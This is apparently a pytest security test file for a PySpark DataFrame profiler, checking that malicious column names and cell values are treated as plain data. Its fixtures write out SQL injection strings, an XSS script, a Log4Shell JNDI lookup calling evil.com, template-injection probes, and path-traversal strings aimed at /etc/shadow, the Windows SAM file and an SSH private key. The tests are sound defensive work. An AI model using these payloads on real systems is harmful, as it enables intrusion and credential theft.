"""
Security tests for pyspark-analyzer.

Tests for:
- Input validation and sanitization
- SQL injection prevention
- Safe data handling
- Sampling security boundaries
"""

import pytest
from pyspark.sql import SparkSession
from pyspark.sql.types import StructType, StructField, StringType
import json

from pyspark_analyzer import DataFrameProfiler, SamplingConfig


class TestSecurityValidation:
    """Test security aspects of the profiler."""

    @pytest.fixture(scope="class")
    def spark(self):
        """Create a SparkSession for tests."""
        return (
            SparkSession.builder.appName("SecurityTests")
            .master("local[2]")
            .config("spark.driver.bindAddress", "127.0.0.1")
            .getOrCreate()
        )

    def test_column_name_sql_injection(self, spark):
        """Test that malicious column names don't cause SQL injection."""
        # Create DataFrame with potentially malicious column names
        malicious_names = [
            "col; DROP TABLE users;--",
            "col' OR '1'='1",
            'col"; DROP TABLE data;--',
            "col`; DELETE FROM table;",
            "col'); INSERT INTO hack VALUES ('pwned');--",
        ]

        schema = StructType(
            [StructField(name, StringType(), True) for name in malicious_names]
        )

        # Create DataFrame with malicious column names
        data = [["safe"] * len(malicious_names)]
        df = spark.createDataFrame(data, schema)

        # Profile should handle these safely
        profiler = DataFrameProfiler(df)
        profile = profiler.profile()

        # Verify all columns were profiled without SQL injection
        assert len(profile["columns"]) == len(malicious_names)
        for col_name in malicious_names:
            assert col_name in profile["columns"]
            assert profile["columns"][col_name]["null_count"] == 0

    def test_data_content_injection(self, spark):
        """Test that malicious data content is handled safely."""
        # Create DataFrame with potentially malicious data
        malicious_data = [
            ("'; DROP TABLE users;--", 1),
            ("<script>alert('XSS')</script>", 2),
            ("${jndi:ldap://evil.com/a}", 3),
            ("../../../etc/passwd", 4),
            ("{{7*7}}", 5),  # Template injection
            ("%{7*7}", 6),  # Expression language injection
        ]

        df = spark.createDataFrame(malicious_data, ["malicious_text", "id"])

        # Profile should handle malicious content safely
        profiler = DataFrameProfiler(df)
        profile = profiler.profile()

        # Verify profiling completed without executing malicious code
        assert profile["row_count"] == 6
        assert "malicious_text" in profile["columns"]
        assert profile["columns"]["malicious_text"]["distinct_count"] == 6

    def test_sampling_boundary_validation(self, spark):
        """Test that sampling respects security boundaries."""
        # Create a large dataset
        df = spark.range(1000000).selectExpr("id", "id % 100 as category")

        # Test various sampling configurations
        test_configs = [
            SamplingConfig(target_size=0),  # Invalid: zero size
            SamplingConfig(target_size=-1000),  # Invalid: negative size
            SamplingConfig(target_size=10**20),  # Invalid: extremely large
            SamplingConfig(sample_fraction=-0.5),  # Invalid: negative fraction
            SamplingConfig(sample_fraction=2.0),  # Invalid: fraction > 1
        ]

        for config in test_configs:
            profiler = DataFrameProfiler(df, sampling_config=config)
            profile = profiler.profile()

            # Verify that invalid configs are handled safely
            sampling_info = profile["sampling"]
            assert sampling_info["method"] in ["full", "random"]

            # If sampling was applied, verify it's within reasonable bounds
            if sampling_info["was_sampled"]:
                assert 0 < sampling_info["sample_size"] <= profile["row_count"]
                assert 0 < sampling_info["fraction"] <= 1.0

    def test_memory_exhaustion_prevention(self, spark):
        """Test that profiler prevents memory exhaustion attacks."""
        # Create a DataFrame with very wide schema
        num_columns = 10000
        columns = [f"col_{i}" for i in range(num_columns)]

        # Create sparse data to avoid actual memory issues
        data = [(i,) * num_columns for i in range(10)]
        df = spark.createDataFrame(data, columns)

        # Profiler should handle wide schemas safely
        profiler = DataFrameProfiler(df)
        profile = profiler.profile()

        # Verify profiling completed
        assert profile["column_count"] == num_columns
        assert profile["row_count"] == 10

    def test_path_traversal_prevention(self, spark):
        """Test that file paths in column names don't cause path traversal."""
        # Create DataFrame with path-like column names
        path_names = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../../root/.ssh/id_rsa",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]

        schema = StructType(
            [StructField(name, StringType(), True) for name in path_names]
        )

        data = [["data"] * len(path_names)]
        df = spark.createDataFrame(data, schema)

        # Profile should handle path-like names safely
        profiler = DataFrameProfiler(df)
        profile = profiler.profile()

        # Verify all columns were profiled without file system access
        assert len(profile["columns"]) == len(path_names)
        for col_name in path_names:
            assert col_name in profile["columns"]

    def test_json_serialization_safety(self, spark):
        """Test that JSON serialization handles special characters safely."""
        # Create DataFrame with special characters that could break JSON
        special_data = [
            ('{"injection": "test"}', 1),
            ("\\x00\\x01\\x02", 2),  # Null bytes
            ("\u0000\u0001\u0002", 3),  # Unicode control characters
            ("a" * 1000000, 4),  # Very long string
        ]

        df = spark.createDataFrame(special_data, ["special_text", "id"])

        profiler = DataFrameProfiler(df)
        profiler.profile()  # Ensure profiling completes without errors

        # Verify JSON serialization works safely
        json_output = profiler.to_json()
        parsed = json.loads(json_output)

        assert parsed["row_count"] == 4
        assert "special_text" in parsed["columns"]

    def test_numeric_overflow_handling(self, spark):
        """Test handling of numeric overflow scenarios."""
        # Create DataFrame with extreme numeric values
        extreme_data = [
            (2**63 - 1, float("inf")),  # Max long, infinity
            (-(2**63), float("-inf")),  # Min long, negative infinity
            (0, float("nan")),  # Zero, NaN
        ]

        df = spark.createDataFrame(extreme_data, ["big_int", "float_val"])

        profiler = DataFrameProfiler(df)
        profile = profiler.profile()

        # Verify extreme values are handled safely
        assert profile["row_count"] == 3
        int_stats = profile["columns"]["big_int"]
        float_stats = profile["columns"]["float_val"]

        # Check that statistics were computed without overflow errors
        assert "min" in int_stats
        assert "max" in int_stats
        assert "mean" in float_stats or "error" in float_stats

    def test_concurrent_access_safety(self, spark):
        """Test that profiler is safe under concurrent access."""
        import threading

        df = spark.range(10000).selectExpr("id", "id % 10 as category")
        results = []
        errors = []

        def profile_concurrent():
            try:
                profiler = DataFrameProfiler(df)
                profile = profiler.profile()
                results.append(profile["row_count"])
            except Exception as e:
                errors.append(str(e))

        # Run multiple profilers concurrently
        threads = []
        for _ in range(5):
            t = threading.Thread(target=profile_concurrent)
            threads.append(t)
            t.start()

        # Wait for all threads
        for t in threads:
            t.join(timeout=30)

        # Verify all completed successfully
        assert len(errors) == 0, f"Concurrent access errors: {errors}"
        assert all(r == 10000 for r in results)

    def test_null_byte_handling(self, spark):
        """Test handling of null bytes in data."""
        # Create DataFrame with null bytes
        null_data = [
            ("normal\x00hidden", 1),
            ("\x00start", 2),
            ("end\x00", 3),
            ("\x00", 4),
        ]

        df = spark.createDataFrame(null_data, ["text_with_nulls", "id"])

        profiler = DataFrameProfiler(df)
        profile = profiler.profile()

        # Verify null bytes don't cause issues
        assert profile["row_count"] == 4
        text_stats = profile["columns"]["text_with_nulls"]
        assert text_stats["null_count"] == 0
        assert text_stats["distinct_count"] == 4


class TestDataPrivacy:
    """Test data privacy aspects of the profiler."""

    @pytest.fixture(scope="class")
    def spark(self):
        """Create a SparkSession for tests."""
        return (
            SparkSession.builder.appName("PrivacyTests")
            .master("local[2]")
            .config("spark.driver.bindAddress", "127.0.0.1")
            .getOrCreate()
        )

    def test_no_raw_data_in_profile(self, spark):
        """Ensure profile doesn't contain raw sensitive data."""
        # Create DataFrame with sensitive data
        sensitive_data = [
            ("123-45-6789", "John Doe", "john@example.com"),
            ("987-65-4321", "Jane Smith", "jane@example.com"),
            ("555-55-5555", "Bob Johnson", "bob@example.com"),
        ]

        df = spark.createDataFrame(sensitive_data, ["ssn", "name", "email"])

        profiler = DataFrameProfiler(df)
        profile = profiler.profile()

        # Convert profile to string representation
        profile_str = json.dumps(profile)

        # Verify no sensitive data appears in profile
        for ssn, name, email in sensitive_data:
            assert ssn not in profile_str
            assert name not in profile_str
            assert email not in profile_str

        # Verify only statistics are present
        assert profile["row_count"] == 3
        assert all(col in profile["columns"] for col in ["ssn", "name", "email"])

    def test_sampling_preserves_privacy(self, spark):
        """Test that sampling doesn't expose individual records."""
        # Create DataFrame with identifiable data
        data = [(i, f"user_{i}", f"email_{i}@example.com") for i in range(10000)]

        df = spark.createDataFrame(data, ["id", "username", "email"])

        # Use aggressive sampling
        config = SamplingConfig(target_size=100)
        profiler = DataFrameProfiler(df, sampling_config=config)
        profile = profiler.profile()

        # Verify no individual records in profile
        profile_str = json.dumps(profile)

        # Check that no individual usernames or emails appear
        for i in range(100):  # Check first 100 records
            assert f"user_{i}" not in profile_str
            assert f"email_{i}@example.com" not in profile_str

        # Verify only aggregate statistics
        assert profile["sampling"]["was_sampled"] is True
        assert profile["columns"]["username"]["distinct_count"] > 0
